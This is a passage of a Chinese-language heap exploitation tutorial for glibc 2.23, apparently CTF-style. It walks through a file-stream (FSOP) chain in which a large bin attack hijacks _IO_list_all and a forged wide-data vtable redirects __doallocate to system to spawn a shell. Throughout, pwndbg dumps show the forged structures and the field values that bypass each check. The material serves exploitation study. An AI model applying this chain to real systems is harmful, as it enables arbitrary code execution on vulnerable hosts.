        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x63c1c5be4200
}
pwndbg> p/x *(struct _IO_jump_t*)0x63c1c5be4200
$5 = {
  __dummy = 0x0,
  __dummy2 = 0x0,
  __finish = 0x0,
  __overflow = 0x0,
  __underflow = 0x0,
  __uflow = 0x0,
  __pbackfail = 0x0,
  __xsputn = 0x0,
  __xsgetn = 0x0,
  __seekoff = 0x0,
  __seekpos = 0x0,
  __setbuf = 0x0,
  __sync = 0x0,
  __doallocate = 0x7d42d2e3c3eb,
  __read = 0x0,
  __write = 0x0,
  __seek = 0x0,
  __close = 0x0,
  __stat = 0x0,
  __showmanyc = 0x0,
  __imbue = 0x0
}
pwndbg> x/5i 0x7d42d2e3c3eb
   0x7d42d2e3c3eb <__libc_system>:      sub    rsp,0x8
   0x7d42d2e3c3ef <__libc_system+4>:    test   rdi,rdi
   0x7d42d2e3c3f2 <__libc_system+7>:    jne    0x7d42d2e3c40a <__libc_system+31>
   0x7d42d2e3c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7d42d2f56d7b
   0x7d42d2e3c3fb <__libc_system+16>:   call   0x7d42d2e3be36 <do_system>
pwndbg> 
```

此时，位于large bin中的`chunk[0]`若被再次释放（`free(chunk[0])`），则会触发glibc的**双重释放（double-free）检测**。分配器在`_int_free`函数中识别到该块已处于空闲状态，进而调用 **`malloc_printerr`** 函数来处理此错误。

**错误处理触发的IO流刷新**
`malloc_printerr`在报告错误的过程中，会调用 **`_IO_flush_all_lockp`** 函数，强制刷新所有已注册的IO流。该函数会遍历由全局指针`_IO_list_all`管理的链表。由于此前通过Large Bin Attack已将`_IO_list_all`劫持为指向伪造结构的`chunk[2]`地址，因此遍历将从此处开始。

**伪造IO流的检查与路径选择**
执行流到达`chunk[2]`上伪造的`_IO_FILE_plus`结构（伪装成一个文件流）后，IO层会检查其状态。通过正确设置`_flags`等字段（如前所述，设置为`0x7c7c7cf5`等值），该伪造流被成功地“说服”为一个有效的、可写的、活跃的输出流。

随后，IO层在尝试“刷新”其输出缓冲区时，会根据其内部状态（如比较`_IO_write_ptr`与`_IO_write_end`）判定缓冲区已满或需要执行刷新操作。此判定将导致通过该流虚表（vtable）调用其 **`_IO_OVERFLOW`** 函数。

**控制流导入预设路径**
由于我们已将伪造流的vtable指针设置为 **`_IO_wfile_jumps`**，因此其`_IO_OVERFLOW`条目实际指向该表中的 **`_IO_wfile_overflow`** 函数。于是，执行流被成功导入预设的宽字符文件处理路径，从通用的错误处理阶段，无缝地衔接至精心构造的利用链起点。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7d42d2e6de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wfile_overflow>
        rdi: 0x63c1c5be4940 ◂— 0x68737c7cf7f5
        rsi: 0xffffffff
```

当执行流进入 **`_IO_wfile_overflow`** 函数后，利用的成功与否取决于能否顺利通过该函数内部的一系列条件检查。由于前期在伪造的`_IO_FILE_plus`结构及其关联的`_IO_wide_data`结构中对相关字段进行了**精心构造**，以下关键检查被逐一绕过：

1.  **绕过“不可写”检查**：代码首先检查`f->_flags & _IO_NO_WRITES`。由于在伪造的`_flags`中清除了`_IO_NO_WRITES`位，此条件不成立，执行流得以继续。

2.  **绕过“非当前输出状态”检查**：随后检查`(f->_flags & _IO_CURRENTLY_PUTTING) == 0`。伪造的`_flags`中正确设置了`_IO_CURRENTLY_PUTTING`位，使该文件流被识别为处于活跃输出状态，从而通过了此项校验。

3.  **绕过“宽数据缓冲区未初始化”检查**：最后，函数检查宽字符输出缓冲区的基础指针，即`if (f->_wide_data->_IO_write_base == 0)`。由于我们已将`_wide_data`指针指向一个可控的伪造`_IO_wide_data`结构，并将该结构中的`_IO_write_base`字段设置为一个非零值（或通过其他方式避免其为NULL），此检查也被成功绕过。

在顺利通过上述所有校验后，执行流不再提前返回，而是继续向下执行，最终调用 **`_IO_wdoallocbuf (f);`**。这一步标志着控制流正式从`_IO_wfile_overflow`进入下一个关键函数。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:441
   435   /* If currently reading or no buffer allocated. */
   436   if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
   437     {
   438       /* Allocate a buffer if needed. */
   439       if (f->_wide_data->_IO_write_base == 0)
   440         {
 ► 441           _IO_wdoallocbuf (f);
```

进入 **`_IO_wdoallocbuf`** 函数后，执行流能否继续前进取决于对伪造结构状态的进一步验证。由于前期的精心布局，以下关键条件被成功满足：

1.  **绕过缓冲区基址检查**：函数首先检查 `if (fp->_wide_data->_IO_buf_base)`。在我们的伪造布局中，已经将`_wide_data`指向的伪造结构内的`_IO_buf_base`字段**设置为0（NULL）**。这使得条件判断为真（指针为NULL，表示宽缓冲区尚未分配），从而允许执行流进入分配缓冲区的分支，而非提前返回。

2.  **满足“非无缓冲”标志**：随后，函数检查 `if (!(fp->_flags & _IO_UNBUFFERED))`。在伪造的`_flags`字段中，我们**确保了`_IO_UNBUFFERED`标志位未被置位**（即该位为0）。这使得文件流被识别为需要进行缓冲的流，条件成立，执行流继续向下。

在顺利通过上述两重检查后，函数将调用 **`_IO_WDOALLOCATE (fp)`** 宏。这个宏的本质是调用伪造的`_IO_wide_data`结构中虚表（`_wide_vtable`）所指向的`__doallocate`函数指针。

由于我们已完全控制该虚表，并将`__doallocate`指针提前设置为目标函数地址（如`system`或`one_gadget`），因此调用`_IO_WDOALLOCATE`即等同于调用目标函数。当目标函数为`system`，且其参数（如`_flags`中嵌入的`"sh"`字符串）已就位时，便成功**获取了shell控制权**。至此，整个从堆破坏到任意代码执行的复杂利用链完成。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wgenops.c:390
   384 void
   385 _IO_wdoallocbuf (_IO_FILE *fp)
   386 {
   387   if (fp->_wide_data->_IO_buf_base)
   388     return;
   389   if (!(fp->_flags & _IO_UNBUFFERED))
 ► 390     if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
 
 ► 0x7d42d2e6575a <_IO_wdoallocbuf+30>    call   qword ptr [rax + 0x68]      <system>
        command: 0x63c1c5be4940 ◂— 0x68737c7cf7f5
```


### 未完待续...

## 参考

https://github.com/BinRacer/pwn4heap/tree/master/src/2.23
